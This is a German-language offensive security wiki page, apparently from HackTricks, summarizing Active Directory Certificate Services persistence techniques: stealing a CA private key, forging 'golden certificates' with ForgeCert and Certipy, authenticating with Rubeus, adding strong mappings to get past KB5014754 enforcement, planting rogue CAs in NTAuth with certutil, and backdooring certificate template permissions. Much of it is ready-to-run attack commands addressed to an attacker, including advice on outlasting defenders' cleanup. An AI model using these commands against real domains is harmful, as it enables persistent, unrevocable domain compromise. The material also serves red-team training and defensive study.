# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine Zusammenfassung der Domain-Persistenz-Techniken, die in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) geteilt werden**. Prüfe sie für weitere Details.

## Fälschen von Zertifikaten mit gestohlenen CA-Zertifikaten (Golden Certificate) - DPERSIST1

Woran erkennt man, dass ein Zertifikat ein CA-Zertifikat ist?

Ein Zertifikat gilt als CA-Zertifikat, wenn mehrere Bedingungen erfüllt sind:

- Das Zertifikat ist auf dem CA-Server gespeichert, wobei der private Schlüssel durch die DPAPI der Maschine oder durch Hardware wie TPM/HSM gesichert ist, sofern das Betriebssystem dies unterstützt.
- Sowohl die Issuer- als auch die Subject-Felder des Zertifikats stimmen mit dem Distinguished Name der CA überein.
- Eine "CA Version"-Erweiterung ist ausschließlich in CA-Zertifikaten vorhanden.
- Das Zertifikat enthält keine Extended Key Usage (EKU)-Felder.

Um den privaten Schlüssel dieses Zertifikats zu extrahieren, ist das auf dem CA-Server verfügbare Tool `certsrv.msc` über die integrierte GUI die unterstützte Methode. Nichtsdestotrotz unterscheidet sich dieses Zertifikat nicht von anderen im System gespeicherten; daher können Methoden wie die [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zur Extraktion angewendet werden.

Das Zertifikat und der private Schlüssel können auch mit Certipy über folgenden Befehl gewonnen werden:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Nachdem das CA-Zertifikat und dessen privater Schlüssel im `.pfx`-Format erlangt wurden, können Tools wie [ForgeCert](https://github.com/GhostPack/ForgeCert) verwendet werden, um gültige Zertifikate zu erzeugen:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Der Benutzer, dessen Zertifikat gefälscht werden soll, muss aktiv sein und sich in Active Directory authentifizieren können, damit der Vorgang gelingt. Das Fälschen eines Zertifikats für spezielle Konten wie krbtgt ist wirkungslos.

Dieses gefälschte Zertifikat wird bis zum angegebenen Enddatum **gültig** sein und solange das Root-CA-Zertifikat **gültig** ist (in der Regel 5 bis **10+ Jahre**). Es ist außerdem für **Maschinen** gültig, sodass in Kombination mit **S4U2Self** ein Angreifer **Persistenz auf jedem Domänencomputer aufrechterhalten** kann, solange das CA-Zertifikat gültig ist.\  
Außerdem können die mit dieser Methode **erzeugten Zertifikate nicht widerrufen** werden, da die CA nicht über sie informiert ist.

### Betrieb unter Strong Certificate Mapping Enforcement (2025+)

Seit dem 11. Februar 2025 (nach dem Rollout von KB5014754) sind Domänencontroller standardmäßig auf **Full Enforcement** für certificate mappings eingestellt. Praktisch bedeutet das, dass Ihre gefälschten Zertifikate entweder:

- Eine starke Bindung an das Zielkonto enthalten (z. B. die SID security extension), oder
- Mit einer starken, expliziten Zuordnung im `altSecurityIdentities`-Attribut des Zielobjekts gekoppelt sein.

Eine zuverlässige Methode zur Persistenz ist, ein gefälschtes Zertifikat zu erstellen, das an die gestohlene Enterprise CA gebunden ist, und dann eine starke, explizite Zuordnung zum betroffenen Principal hinzuzufügen:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Hinweise
- Wenn Sie forged certificates erstellen können, die die SID security extension enthalten, werden diese auch unter Full Enforcement implizit abgebildet. Andernfalls sollten Sie explicit strong mappings bevorzugen. Siehe [account-persistence](account-persistence.md) für mehr zu explicit mappings.
- Revocation hilft den Verteidigern hier nicht: forged certificates sind der CA database unbekannt und können daher nicht revoked werden.

## Vertrauen in Rogue CA Certificates - DPERSIST2

Das `NTAuthCertificates`-Objekt ist so definiert, dass es ein oder mehrere **CA certificates** in seinem `cacertificate`-Attribut enthält, die von Active Directory (AD) genutzt werden. Der Verifizierungsprozess durch den **domain controller** prüft das `NTAuthCertificates`-Objekt auf einen Eintrag, der mit der in dem Issuer-Feld des authentifizierenden **certificate** angegebenen **CA specified** übereinstimmt. Die Authentifizierung erfolgt, wenn eine Übereinstimmung gefunden wird.

Ein self-signed CA certificate kann von einem Angreifer zum `NTAuthCertificates`-Objekt hinzugefügt werden, vorausgesetzt, er hat Kontrolle über dieses AD-Objekt. Normalerweise dürfen nur Mitglieder der Gruppe **Enterprise Admin**, sowie **Domain Admins** oder **Administrators** in der **forest root’s domain**, dieses Objekt ändern. Sie können das `NTAuthCertificates`-Objekt mit `certutil.exe` und dem Befehl `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` bearbeiten oder das [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) verwenden.

Weitere hilfreiche Befehle für diese technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Diese Fähigkeit ist besonders relevant, wenn sie zusammen mit einer zuvor beschriebenen Methode unter Verwendung von ForgeCert zum dynamischen Erstellen von Zertifikaten eingesetzt wird.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Bösartige Fehlkonfiguration - DPERSIST3

Möglichkeiten zur **Persistenz** durch Änderungen an Security Describern von **AD CS**-Komponenten sind zahlreich. Modifikationen, die im Abschnitt "[Domain Escalation](domain-escalation.md)" beschrieben werden, können von einem Angreifer mit erhöhtem Zugang missbräuchlich implementiert werden. Dazu gehört das Hinzufügen von "control rights" (z. B. WriteOwner/WriteDACL/etc.) zu sensiblen Komponenten wie:

- Das **AD-Computerobjekt des CA-Servers**
- Der **RPC/DCOM-Server des CA-Servers**
- Jedes **untergeordnete AD-Objekt oder -Container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (zum Beispiel der Container Certificate Templates, der Container Certification Authorities, das NTAuthCertificates-Objekt, etc.)
- **AD-Gruppen**, denen standardmäßig oder durch die Organisation Rechte zur Kontrolle von AD CS delegiert wurden (z. B. die eingebaute Gruppe Cert Publishers und deren Mitglieder)

Ein Beispiel für eine bösartige Umsetzung wäre, dass ein Angreifer mit **erhöhten Berechtigungen** in der Domain die Berechtigung **`WriteOwner`** an der standardmäßigen **`User`**-Zertifikatvorlage hinzufügt, wobei der Angreifer selbst der Principal für das Recht ist. Um dies auszunutzen, würde der Angreifer zunächst den Besitzer der **`User`**-Vorlage auf sich selbst ändern. Danach würde auf der Vorlage das **`mspki-certificate-name-flag`** auf **1** gesetzt, um **`ENROLLEE_SUPPLIES_SUBJECT`** zu aktivieren, sodass ein Benutzer im Antrag ein Subject Alternative Name angeben kann. Anschließend könnte sich der Angreifer mit der **Vorlage** **enroll**en, einen **domain administrator**-Namen als alternativen Namen wählen und das erworbene Zertifikat zur Authentifizierung als DA verwenden.

Praktische Einstellungen, die Angreifer für langfristige Domain-Persistenz setzen können (siehe {{#ref}}domain-escalation.md{{#endref}} für vollständige Details und Erkennung):

- CA-Policy-Flags, die SANs von Antragstellern erlauben (z. B. Aktivierung von `EDITF_ATTRIBUTESUBJECTALTNAME2`). Dadurch bleiben ESC1-like Pfade ausnutzbar.
- Template-DACL oder Einstellungen, die eine Ausstellung erlauben, die für die Authentifizierung verwendet werden kann (z. B. Hinzufügen der Client Authentication EKU, Aktivierung von `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolle über das `NTAuthCertificates`-Objekt oder die CA-Container, um bösartige Aussteller kontinuierlich wieder einzuführen, falls Verteidiger Bereinigungsversuche unternehmen.

> [!TIP]
> In gehärteten Umgebungen nach KB5014754 stellt die Kombination dieser Fehlkonfigurationen mit expliziten starken Zuordnungen (`altSecurityIdentities`) sicher, dass Ihre ausgestellten oder gefälschten Zertifikate weiterhin verwendbar bleiben, selbst wenn DCs starke Zuordnungen durchsetzen.

## References

- Microsoft KB5014754 – Änderungen an der zertifikatbasierten Authentifizierung auf Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Befehlsreferenz und Nutzung von forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
